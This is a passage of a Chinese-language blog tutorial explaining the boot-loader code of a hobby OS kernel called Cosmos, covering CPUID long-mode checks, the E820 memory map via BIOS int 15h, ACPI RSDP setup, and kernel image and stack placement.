\n\t&quot;</span><span class="comment">//</span></span><br><span class="line">        :<span class="string">&quot;=c&quot;</span>(rets)</span><br><span class="line">        :</span><br><span class="line">        :</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">return</span> rets;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再检查CPU是否支持长模式</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">chk_cpu_longmode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> rets = <span class="number">0</span>; <span class="comment">// 定义一个变量rets，用来存储检测结果，初始化为0</span></span><br><span class="line">    __asm__ __volatile__(</span><br><span class="line">        <span class="string">&quot;movl $0x80000000,%%eax \n\t&quot;</span> <span class="comment">// 将0x80000000移动到EAX寄存器中</span></span><br><span class="line">        <span class="string">&quot;cpuid \n\t&quot;</span> <span class="comment">// 执行CPUID指令，CPUID指令会根据EAX寄存器的值返回不同的信息，当EAX为0x80000000时，执行CPUID指令后，EAX寄存器会返回一个值，这个值是CPU支持的最大扩展功能号。如果这个返回值大于0x80000000，那么就表示CPU支持一系列扩展功能</span></span><br><span class="line">        <span class="string">&quot;cmpl $0x80000001,%%eax \n\t&quot;</span> <span class="comment">// 比较EAX寄存器的值和0x80000001，如果EAX小于0x80000001，那么处理器不支持0x80000001号功能</span></span><br><span class="line">        <span class="string">&quot;setnb %%al \n\t&quot;</span> <span class="comment">// Set Byte if Not Below（如果不低于则设置字节），如果EAX大于或等于0x80000001，将AL设置为1</span></span><br><span class="line">        <span class="string">&quot;jb 1f \n\t&quot;</span> <span class="comment">// 如果EAX小于0x80000001，跳转到标签1</span></span><br><span class="line">        <span class="string">&quot;movl $0x80000001,%%eax \n\t&quot;</span> <span class="comment">// 将0x80000001移动到EAX寄存器中</span></span><br><span class="line">        <span class="string">&quot;cpuid \n\t&quot;</span> <span class="comment">// 再次执行CPUID指令，这次CPUID调用是为了获取扩展功能信息</span></span><br><span class="line">        <span class="string">&quot;bt $29,%%edx \n\t&quot;</span> <span class="comment">// 检查EDX寄存器的第29位（长模式支持位），如果第29位为1，表示支持长模式</span></span><br><span class="line">        <span class="string">&quot;setcb %%al \n\t&quot;</span> <span class="comment">// 如果第29位为1，将AL设置为1</span></span><br><span class="line">        <span class="string">&quot;1: \n\t&quot;</span> <span class="comment">// 标签1</span></span><br><span class="line">        <span class="string">&quot;movzx %%al,%%eax \n\t&quot;</span> <span class="comment">// 将AL的值扩展到EAX寄存器中</span></span><br><span class="line">        : <span class="string">&quot;=a&quot;</span>(rets)</span><br><span class="line">        : </span><br><span class="line">        : </span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">return</span> rets; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果以上检测都通过了，就在上面的machbstart_t信息结构中填入cpu模式为64</p><h2 id="获取内存布局"><a href="#获取内存布局" class="headerlink" title="获取内存布局"></a>获取内存布局</h2><p>我们先来了解一下要获得的信息如何储存</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RAM_USABLE 1 <span class="comment">//可用内存</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RAM_RESERV 2 <span class="comment">//保留内存不可使用</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RAM_ACPIREC 3 <span class="comment">//ACPI表相关的</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RAM_ACPINVS 4 <span class="comment">//ACPI NVS空间</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RAM_AREACON 5 <span class="comment">//包含坏内存</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">s_e820</span>&#123;</span></span><br><span class="line">    <span class="keyword">u64_t</span> saddr;    <span class="comment">//内存开始地址</span></span><br><span class="line">    <span class="keyword">u64_t</span> lsize;    <span class="comment">//内存大小</span></span><br><span class="line">    <span class="keyword">u32_t</span> type;    <span class="comment">//内存类型 </span></span><br><span class="line">&#125;<span class="keyword">e820map_t</span>;</span><br></pre></td></tr></table></figure><p>获取的内存布局信息就保存在这样的结构体数组。而我们要通过init_mem函数来获取这样的结构体数组，并对内存进行检测</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_mem</span><span class="params">(<span class="keyword">machbstart_t</span> *mbsp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">e820map_t</span> *retemp;</span><br><span class="line">    <span class="keyword">u32_t</span> retemnr = <span class="number">0</span>;</span><br><span class="line">    mbsp-&gt;mb_ebdaphyadr = acpi_get_bios_ebda();<span class="comment">//获取 EBDA 的物理地址并存储在 mbsp-&gt;mb_ebdaphyadr 中</span></span><br><span class="line">    mmap(&amp;retemp, &amp;retemnr);<span class="comment">// 调用 mmap 函数获取 e820map_t 结构体的信息</span></span><br><span class="line">    <span class="keyword">if</span> (retemnr == <span class="number">0</span>)<span class="comment">// 检查是否成功获取了 e820map</span></span><br><span class="line">    &#123;</span><br><span class="line">        kerror(<span class="string">&quot;no e820map\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (chk_memsize(retemp, retemnr, <span class="number">0x100000</span>, <span class="number">0x8000000</span>) == <span class="literal">NULL</span>)<span class="comment">// 检查内存大小是否满足要求</span></span><br><span class="line">    &#123;</span><br><span class="line">        kerror(<span class="string">&quot;Your computer is low on memory, the memory cannot be less than 128MB!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    mbsp-&gt;mb_e820padr = (<span class="keyword">u64_t</span>)((<span class="keyword">u32_t</span>)(retemp));<span class="comment">//把e820map_t结构数组的首地址传给mbsp-&gt;mb_e820padr</span></span><br><span class="line">    mbsp-&gt;mb_e820nr = (<span class="keyword">u64_t</span>)retemnr;<span class="comment">//把e820map_t结构数组元素个数传给mbsp-&gt;mb_e820nr</span></span><br><span class="line">    mbsp-&gt;mb_e820sz = retemnr * (<span class="keyword">sizeof</span>(<span class="keyword">e820map_t</span>));<span class="comment">//把e820map_t结构数组大小传给mbsp-&gt;mb_e820sz</span></span><br><span class="line">    mbsp-&gt;mb_memsz = get_memsize(retemp, retemnr);<span class="comment">//根据e820map_t结构数据计算内存大小。</span></span><br><span class="line">    init_acpi(mbsp);<span class="comment">//调用 init_acpi 函数进行 ACPI 初始化</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>acpi_get_bios_ebda是将EBDA的地址返回，我们重点看看mmap函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmap</span><span class="params">(<span class="keyword">e820map_t</span> **retemp, <span class="keyword">u32_t</span> *retemnr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    realadr_call_entry(RLINTNR(<span class="number">0</span>), <span class="number">0</span>, <span class="number">0</span>); <span class="comment">//eax = 0 edx = 0 ecx = 0</span></span><br><span class="line">    *retemnr = *((<span class="keyword">u32_t</span> *)(E80MAP_NR));</span><br><span class="line">    *retemp = (<span class="keyword">e820map_t</span> *)(*((<span class="keyword">u32_t</span> *)(E80MAP_ADRADR)));</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的realadr_call_entry参数eax为0，其调用的是realintsve.asm文件中func_table第一个函数_getmmap，我们来看看这个汇编函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_getmmap:</span><br><span class="line">    push ds</span><br><span class="line">    push es</span><br><span class="line">    push ss</span><br><span class="line">    mov esi,0</span><br><span class="line">    mov dword[E80MAP_NR],esi;E80MAP_NR设为0</span><br><span class="line">    mov dword[E80MAP_ADRADR],E80MAP_ADR;e820map结构体开始地址</span><br><span class="line">    xor ebx,ebx ;ebx设置为0</span><br><span class="line">    mov edi,E80MAP_ADR;将E80MAP_ADR传递给edi,存储e820map结构的初始位置</span><br><span class="line">loop:</span><br><span class="line">    mov eax,0e820h;获取e820map结构参数</span><br><span class="line">mov ecx,20;输出结果数据项的大小为20字节：8字节内存基地址，8字节内存长度，4字节内存类型</span><br><span class="line">mov edx,0534d4150h;获取e820map结构参数必须是这个数据</span><br><span class="line">int 15h;BIOS的15h中断</span><br><span class="line">jc .1;如果进位标志被设置（表示出现错误），跳转到标签 .1</span><br><span class="line">add edi,20;将 edi 的值增加 20（移动到下一个内存位置）</span><br><span class="line">cmp edi,E80MAP_ADR+0x1000;将 edi 与 E80MAP_ADR + 0x1000 进行比较</span><br><span class="line">jg .1;如果 edi 大于 E80MAP_ADR + 0x1000，跳转到标签 .1</span><br><span class="line">inc esi;增加 esi 的值（循环计数器）</span><br><span class="line">cmp ebx,0;将 ebx 与零进行比较</span><br><span class="line">jne loop;如果 ebx 不等于零，则重复循环</span><br><span class="line">jmp .2</span><br><span class="line"></span><br><span class="line">.1:</span><br><span class="line">mov esi,0;将 esi 的值重置为零</span><br><span class="line"></span><br><span class="line">.2:</span><br><span class="line">mov dword[E80MAP_NR],esi;将最终的 esi 值存储到由 E80MAP_NR 指向的内存位置</span><br><span class="line">pop ss</span><br><span class="line">pop es</span><br><span class="line">pop ds</span><br><span class="line">ret    </span><br></pre></td></tr></table></figure><p>我先简单说明一下int 15h调用e820h的各个参数</p><table><thead><tr><th>Register</th><th>含义</th></tr></thead><tbody><tr><td>EAX</td><td><strong>E820h</strong>这是用来指示BIOS获取系统内存映射的功能码</td></tr><tr><td>EBX</td><td>包含获取下一个物理内存范围的续传值。这是此例程之前调用返回的值。如果这是第一次调用，EBX必须包含零。</td></tr><tr><td>ES:DI</td><td>缓冲区指针指向地址范围描述符结构的指针，BIOS会填充这个结构。</td></tr><tr><td>ECX</td><td>缓冲区大小传递给BIOS的结构的长度（以字节为单位）。BIOS会填充ECX寄存器中指示的结构的字节数最小大小是20字节</td></tr><tr><td>EDX</td><td>签名‘SMAP’ 由BIOS使用，以验证调用者是否请求将系统映射信息返回到ES:DI中。</td></tr></tbody></table><p>上面的函数将ebx设置为0，将edi设置为存储e820map结构的初始位置。接下来进入循环，如果中途出错或者内存空间不足以获取内存空间就将esi值设置为0，以便后续报错，如果正常获取，当ebx值为0时，证明获取完毕，向E80MAP_NR地址填入有多少值，返回之前的函数即可。</p><p>我们回看之前的init _mem函数，如果retemnr也就是之前的E80MAP_NR为0的话，报错；如果正常的话进行下一步。接下来调用chk_memsize，该函数是检查内存大小是否满足要求。之后向machbstart_t结构中填入相关数据，在这个函数的最后，获取MRSDP。在调用 <code>int 15h</code> 中断，<code>eax = e820h</code> 功能时，所返回的“内存区域”是指系统物理地址空间中的特定区间（通常以起始地址和长度描述）。这些区域有不同的功能和用途，它们共同构成了系统物理内存的完整布局。</p><p>具体来说，这些内存区域可以是以下几种类型：</p><hr><h3 id="1-可用内存区域-Usable-Memory"><a href="#1-可用内存区域-Usable-Memory" class="headerlink" title="1. 可用内存区域 (Usable Memory)"></a><strong>1. 可用内存区域 (Usable Memory)</strong></h3><ul><li><p><strong>描述</strong>：可以供操作系统自由使用的内存。</p></li><li><p><strong>标识</strong>：<code>Type = 1</code></p></li><li><p>用途</p><p>：</p><ul><li>这部分内存是操作系统用于分配应用程序内存的主要区域。</li><li>典型的可用内存区域通常从低地址开始（例如1MB以上）直到系统物理内存的上限。</li></ul></li><li><p>范围</p><p>：</p><ul><li>在传统x86系统中，通常可用内存从 1MB 到约 3GB 或更高（具体依赖于硬件配置）。</li></ul></li></ul><hr><h3 id="2-保留内存区域-Reserved-Memory"><a href="#2-保留内存区域-Reserved-Memory" class="headerlink" title="2. 保留内存区域 (Reserved Memory)"></a><strong>2. 保留内存区域 (Reserved Memory)</strong></h3><ul><li><p><strong>描述</strong>：已被系统或硬件设备使用的内存区域，操作系统不能自由访问。</p></li><li><p><strong>标识</strong>：<code>Type = 2</code></p></li><li><p>用途</p><p>：</p><ul><li>BIOS占用：BIOS代码或数据需要存储在物理内存的某些地址。</li><li>映射到设备：硬件设备可能会将内存映射到特定地址，比如显卡帧缓冲区。</li><li>不可用区域：其他可能无法使用的区域（例如物理地址不连续时的间隙）。</li></ul></li><li><p>例子</p><p>：</p><ul><li>通常在 0xA0000 到 0xFFFFF 之间会有一部分内存保留给 BIOS 和显卡。</li></ul></li></ul><hr><h3 id="3-ACPI-可回收内存区域-ACPI-Reclaimable-Memory"><a href="#3-ACPI-可回收内存区域-ACPI-Reclaimable-Memory" class="headerlink" title="3. ACPI 可回收内存区域 (ACPI Reclaimable Memory)"></a><strong>3. ACPI 可回收内存区域 (ACPI Reclaimable Memory)</strong></h3><ul><li><p><strong>描述</strong>：ACPI（Advanced Configuration and Power Interface，高级配置和电源接口）使用的内存区域，但在系统启动完成后，可以回收供操作系统使用。</p></li><li><p><strong>标识</strong>：<code>Type = 3</code></p></li><li><p>用途</p><p>：</p><ul><li>用于存储 ACPI 表等配置数据。</li><li>操作系统启动后（完成引导阶段），ACPI 数据被读取后，这部分内存可以释放。</li></ul></li></ul><hr><h3 id="4-ACPI-NVS（Non-Volatile-Storage）区域"><a href="#4-ACPI-NVS（Non-Volatile-Storage）区域" class="headerlink" title="4. ACPI NVS（Non-Volatile Storage）区域"></a><strong>4. ACPI NVS（Non-Volatile Storage）区域</strong></h3><ul><li><p><strong>描述</strong>：ACPI 非易失存储（ACPI NVS）的内存区域。</p></li><li><p><strong>标识</strong>：<code>Type = 4</code></p></li><li><p>用途</p><p>：</p><ul><li>用于 ACPI 固定的数据存储（如系统休眠或设备状态保存）。</li><li>操作系统不能占用或修改此区域的内容。</li></ul></li><li><p>典型特性</p><p>：</p><ul><li>比如，在系统进入 S3、S4（睡眠或休眠）模式时，这些区域存储恢复所需的数据。</li></ul></li></ul><hr><h3 id="5-未定义-专用用途的内存区域"><a href="#5-未定义-专用用途的内存区域" class="headerlink" title="5. 未定义/专用用途的内存区域"></a><strong>5. 未定义/专用用途的内存区域</strong></h3><ul><li><p><strong>描述</strong>：其他保留的或硬件特定的内存区域，具体用途通常由硬件设备或系统设计决定。</p></li><li><p><strong>标识</strong>：<code>Type = 5</code>（或其他未定义值）</p></li><li><p>用途</p><p>：</p><ul><li>专用硬件可能需要的内存区（如 DMA 的缓冲区、显卡特定缓冲区等）。</li><li>有些值可能是保留给未来扩展使用的。</li></ul></li></ul><hr><h3 id="6-视频内存区域-特殊用途"><a href="#6-视频内存区域-特殊用途" class="headerlink" title="6. 视频内存区域 (特殊用途)"></a><strong>6. 视频内存区域 (特殊用途)</strong></h3><ul><li><p><strong>描述</strong>：某些内存地址可能直接映射到硬件设备，例如显卡的帧缓冲区。</p></li><li><p>用途</p><p>：</p><ul><li>通常在 0xA0000 到 0xBFFFF 区间，这是传统的显存区域，用于显示数据。</li><li>高地址的部分也可能是 PCI设备或显卡占用。</li></ul></li></ul><hr><h3 id="7-内存映射-I-O-区域"><a href="#7-内存映射-I-O-区域" class="headerlink" title="7. 内存映射 I/O 区域"></a><strong>7. 内存映射 I/O 区域</strong></h3><ul><li><p><strong>描述</strong>：部分物理内存地址可能映射到硬件设备的寄存器。</p></li><li><p>用途</p><p>：</p><ul><li>比如 PCI设备的配置空间。</li><li>CPU通过这些区域与硬件设备通信，而非真正的数据存储用途。</li></ul></li></ul><hr><h3 id="8-典型内存区域划分示例"><a href="#8-典型内存区域划分示例" class="headerlink" title="8. 典型内存区域划分示例"></a><strong>8. 典型内存区域划分示例</strong></h3><p>以一个传统的 32 位 x86 系统为例，典型的内存区域可能如下：</p><table><thead><tr><th>起始地址</th><th>结束地址</th><th>类型</th><th>描述</th></tr></thead><tbody><tr><td>0x00000000</td><td>0x0009FFFF</td><td>可用内存</td><td>常规内存（低 640KB）</td></tr><tr><td>0x000A0000</td><td>0x000BFFFF</td><td>保留内存</td><td>视频内存（VGA 显存）</td></tr><tr><td>0x000C0000</td><td>0x000FFFFF</td><td>保留内存</td><td>BIOS 数据</td></tr><tr><td>0x00100000</td><td>0x7FFFFFFF</td><td>可用内存</td><td>常规内存（高 1MB 以上的系统可用内存）</td></tr><tr><td>0x80000000</td><td>0xFFFFFFFF</td><td>保留/设备映射区域</td><td>硬件保留、设备映射区、PCI内存映射等</td></tr></tbody></table><p>现代系统中（特别是 64 位系统），内存划分更加复杂，会包括大于 4GB 的物理地址空间。</p><p>接下来我们看看init_acpi(mbsp)函数，这个函数主要是对ACPI进行一个初始化，</p><h3 id="ACPI初始化"><a href="#ACPI初始化" class="headerlink" title="ACPI初始化"></a>ACPI初始化</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">PUBLIC <span class="keyword">void</span> <span class="title">init_acpi</span><span class="params">(<span class="keyword">machbstart_t</span> *mbsp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">mrsdp_t</span> *rdp = <span class="literal">NULL</span>;</span><br><span class="line">    rdp = find_acpi_rsdp();<span class="comment">//尝试通过 find_acpi_rsdp 函数查找 ACPI 的根系统描述指针</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == rdp)<span class="comment">//检测指针是否存在</span></span><br><span class="line">    &#123;</span><br><span class="line">        kerror(<span class="string">&quot;Your computer is not support ACPI!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    m2mcopy(rdp, &amp;mbsp-&gt;mb_mrsdp, (<span class="keyword">sint_t</span>)((<span class="keyword">sizeof</span>(<span class="keyword">mrsdp_t</span>))));<span class="comment">//将结构体复制过去</span></span><br><span class="line">    <span class="keyword">if</span> (acpi_rsdp_isok(&amp;mbsp-&gt;mb_mrsdp) == <span class="literal">NULL</span>)<span class="comment">//函数检查复制的数据是否有效</span></span><br><span class="line">    &#123;</span><br><span class="line">        kerror(<span class="string">&quot;Your computer is not support ACPI!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们先来看看关于APIC的结构体</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">s_MRSDP</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">u64_t</span> rp_sign;<span class="comment">//签名字段，用于标识这个结构体包含的数据类型或格式</span></span><br><span class="line">    <span class="keyword">u8_t</span> rp_chksum;<span class="comment">//校验和字段，用于验证结构体数据的完整性</span></span><br><span class="line">    <span class="keyword">u8_t</span> rp_oemid[<span class="number">6</span>];<span class="comment">//OEM（原始设备制造商）标识符，用于标识创建这个表的硬件制造商</span></span><br><span class="line">    <span class="keyword">u8_t</span> rp_revn;<span class="comment">//修订号，指示这个结构体或数据表的版本</span></span><br><span class="line">    <span class="keyword">u32_t</span> rp_rsdtphyadr;<span class="comment">//RSDT（Root System Description Table）的物理地址，这是ACPI中的一个表，包含了其他所有系统描述表的地址</span></span><br><span class="line">    <span class="keyword">u32_t</span> rp_len;<span class="comment">//RSDP 的长度</span></span><br><span class="line">    <span class="keyword">u64_t</span> rp_xsdtphyadr;<span class="comment">//XSDT（Extended System Description Table）的物理地址，这是一个扩展的系统描述表，包含了更多的系统描述表地址</span></span><br><span class="line">    <span class="keyword">u8_t</span> rp_echksum;<span class="comment">//扩展校验和，可能用于验证整个结构体或扩展表的完整性</span></span><br><span class="line">    <span class="keyword">u8_t</span> rp_resv[<span class="number">3</span>];<span class="comment">//保留字段，必须填充为零，用于对齐或未来扩展</span></span><br><span class="line">&#125;__attribute__((packed)) <span class="keyword">mrsdp_t</span>;<span class="comment">//这里的__attribute__((packed))用于告诉编译器取消结构体在编译过程中字段紧密排列，没有内存对齐填充</span></span><br></pre></td></tr></table></figure><p><code>mrsdp_t</code> 表示 ACPI RSDP，主要作用如下：</p><ol><li><strong>标识 ACPI 的存在</strong>：<ul><li>系统通过 <code>rp_sign</code> 字段（签名）识别 ACPI 的存在。</li><li>签名通常是 <code>&quot;RSD PTR &quot;</code>, 用于表明这是一段有效的 ACPI 数据。</li></ul></li><li><strong>提供入口点</strong>：<ul><li>它包含了指向 ACPI 其他系统描述表（如 RSDT 或 XSDT）的地址。</li><li>RSDT 和 XSDT 是核心的 ACPI 表，记录了系统中所有 ACPI 表的地址。</li></ul></li><li><strong>支持电源管理和硬件配置</strong>：<ul><li>操作系统通过解析 ACPI 表（通过 RSDP 提供的入口地址）来实现高级电源管理功能，例如待机、休眠等。</li><li>还用于硬件设备的动态配置和资源管理。</li></ul></li></ol><h2 id="获取映像文件大小"><a href="#获取映像文件大小" class="headerlink" title="获取映像文件大小"></a>获取映像文件大小</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">u64_t</span> <span class="title">get_wt_imgfilesz</span><span class="params">(<span class="keyword">machbstart_t</span> *mbsp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">u64_t</span> retsz = LDRFILEADR; <span class="comment">// 初始化返回的文件大小为加载文件地址</span></span><br><span class="line">    <span class="keyword">mlosrddsc_t</span> *mrddadrs = MRDDSC_ADR;<span class="comment">// 获取内存中影响文件头描述符的地址</span></span><br><span class="line">    <span class="keyword">if</span> (mrddadrs-&gt;mdc_endgic != MDC_ENDGIC ||</span><br><span class="line">        mrddadrs-&gt;mdc_rv != MDC_RVGIC ||</span><br><span class="line">        mrddadrs-&gt;mdc_fhdnr &lt; <span class="number">2</span> ||</span><br><span class="line">        mrddadrs-&gt;mdc_filnr &lt; <span class="number">2</span>)<span class="comment">//检查基本信息，如果不正确，则返回0</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (mrddadrs-&gt;mdc_filbk_e &lt; <span class="number">0x4000</span>)<span class="comment">//检查文件块结束地址是否有效</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    retsz += mrddadrs-&gt;mdc_filbk_e;</span><br><span class="line">    retsz -= LDRFILEADR;<span class="comment">// 将文件块结束地址加到retsz上，然后减去LDRFILEADR，得到文件的实际大小</span></span><br><span class="line">    mbsp-&gt;mb_imgpadr = LDRFILEADR;<span class="comment">// 设置machbstart_t结构体中的mb_imgpadr为LDRFILEADR，即映像文件的加载地址</span></span><br><span class="line">    mbsp-&gt;mb_imgsz = retsz;<span class="comment">// 设置machbstart_t结构体中的mb_imgsz为计算出的文件大小</span></span><br><span class="line">    <span class="keyword">return</span> retsz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取映像文件的起始地址和大小，如果基础信息错误或者文件结束地址无效则报错</p><h2 id="初始化内核栈"><a href="#初始化内核栈" class="headerlink" title="初始化内核栈"></a>初始化内核栈</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_krlinitstack</span><span class="params">(<span class="keyword">machbstart_t</span> *mbsp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">1</span> &gt; move_krlimg(mbsp, (<span class="keyword">u64_t</span>)(<span class="number">0x8f000</span>), <span class="number">0x1001</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        kerror(<span class="string">&quot;iks_moveimg err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    mbsp-&gt;mb_krlinitstack = IKSTACK_PHYADR;<span class="comment">//栈顶地址</span></span><br><span class="line">    mbsp-&gt;mb_krlitstacksz = IKSTACK_SIZE;<span class="comment">//栈大小是4KB</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先先确认内核栈空间是否和之前加入内存中的内容有冲突，move_krlimg函数首先先检查地址是否合法，再通过adrzone_is_ok函数来检查两份内存空间是否有重叠，如果重叠，接着对照之前获取的内存信息，检查内存是否可用，如果这部分也通过了，就将内核映像文件复制到栈空间之后，目的是腾出之前那部分的内存，防止后面重叠覆盖，但是目前来看，如果使用内核栈的过程中有栈溢出漏洞的话，是可以轻易覆盖掉这部分内容的，如果没有重叠则直接返回。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">move_krlimg</span><span class="params">(<span class="keyword">machbstart_t</span> *mbsp, <span class="keyword">u64_t</span> cpyadr, <span class="keyword">u64_t</span> cpysz)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0xffffffff</span> &lt;= (cpyadr + cpysz) || <span class="number">1</span> &gt; cpysz)<span class="comment">// 检查传进来的地址是否合法</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">void</span> *toadr = (<span class="keyword">void</span> *)((<span class="keyword">u32_t</span>)(P4K_ALIGN(cpyadr + cpysz)));<span class="comment">// 计算目标地址（向上对齐到4KB的倍数）</span></span><br><span class="line">    <span class="keyword">sint_t</span> tosz = (<span class="keyword">sint_t</span>)mbsp-&gt;mb_imgsz;<span class="comment">// 获取映像文件空间的大小</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != adrzone_is_ok(mbsp-&gt;mb_imgpadr, mbsp-&gt;mb_imgsz, cpyadr, cpysz))<span class="comment">// 检查源地址和大小是否和已经存在的内容重叠</span></span><br><span class="line">    &#123;   <span class="comment">//如果重叠  </span></span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">NULL</span> == chk_memsize((<span class="keyword">e820map_t</span> *)((<span class="keyword">u32_t</span>)(mbsp-&gt;mb_e820padr)), (<span class="keyword">u32_t</span>)mbsp-&gt;mb_e820nr, (<span class="keyword">u64_t</span>)((<span class="keyword">u32_t</span>)toadr), (<span class="keyword">u64_t</span>)tosz))<span class="comment">//检查内存大小是否足够</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        m2mcopy((<span class="keyword">void</span> *)((<span class="keyword">u32_t</span>)mbsp-&gt;mb_imgpadr), toadr, tosz);<span class="comment">// 复制映像内容到0x90000的地址</span></span><br><span class="line">        mbsp-&gt;mb_imgpadr = (<span class="keyword">u64_t</span>)((<span class="keyword">u32_t</span>)toadr);<span class="comment">// 更新映像的起始地址</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>;<span class="comment">//如果不重叠</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="放置内核文件"><a href="#放置内核文件" class="headerlink" title="放置内核文件"></a>放置内核文件</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_krlfile</span><span class="params">(<span class="keyword">machbstart_t</span> *mbsp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">u64_t</span> sz = r_file_to_padr(mbsp, IMGKRNL_PHYADR, <span class="string">&quot;Cosmos.bin&quot;</span>);<span class="comment">////在映像中查找相应的文件，并复制到对应的地址，并返回文件的大小，这里是查找Cosmos.bin文件</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> == sz)</span><br><span class="line">    &#123;</span><br><span class="line">        kerror(<span class="string">&quot;r_file_to_padr err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    mbsp-&gt;mb_krlimgpadr = IMGKRNL_PHYADR;<span class="comment">//填入内核起始地址</span></span><br><span class="line">    mbsp-&gt;mb_krlsz = sz;<span class="comment">//填入内核大小</span></span><br><span class="line">    mbsp-&gt;mb_nextwtpadr = P4K_ALIGN(mbsp-&gt;mb_krlimgpadr + mbsp-&gt;mb_krlsz);<span class="comment">//始终要保持指向下一段空闲内存的首地址</span></span><br><span class="line">    mbsp-&gt;mb_kalldendpadr = mbsp-&gt;mb_krlimgpadr + mbsp-&gt;mb_krlsz;<span class="comment">//计算内核结束地址并保存</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先来看r_file_to_padr函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">u64_t</span> <span class="title">r_file_to_padr</span><span class="params">(<span class="keyword">machbstart_t</span> *mbsp, <span class="keyword">u32_t</span> f2adr, <span class="keyword">char_t</span> *fnm)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == f2adr || <span class="literal">NULL</span> == fnm || <span class="literal">NULL</span> == mbsp)<span class="comment">//检查参数</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">u32_t</span> fpadr = <span class="number">0</span>, sz = <span class="number">0</span>;</span><br><span class="line">    get_file_rpadrandsz(fnm, mbsp, &amp;fpadr, &amp;sz);<span class="comment">//查找文件</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> == fpadr || <span class="number">0</span> == sz)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == chk_memsize((<span class="keyword">e820map_t</span> *)((<span 